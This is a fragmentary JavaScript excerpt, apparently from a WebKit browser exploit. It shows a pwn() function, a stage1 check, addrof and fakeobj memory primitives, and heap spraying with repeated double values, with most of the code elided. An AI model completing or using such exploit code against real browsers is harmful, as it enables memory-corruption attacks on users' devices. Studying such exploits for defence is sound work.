...
function pwn(binary) {
    var stage1 = {
        ...
        test: function() {
            ...
            if (x.a != 4919) fail("webkit exploit failed: please reload the page or restart the app and wait a few seconds before retrying")
        }
    };
    stage1.test();
    var memory = get_mem_old(stage1);
    var addrfake;
    if (memory.hasOwnProperty("fakeobj") &&
        memory.hasOwnProperty("addrof")) addrfake = memory;
...
function get_mem_old(stage1) {
    ...
    var address =
        Add(stage1.addrof(container), 16);
...
function get_mem_new(stage1) {
    ...
    var unboxed = alloc_above_manager("[" +
        "13.37,".repeat(unboxed_size) + "]");
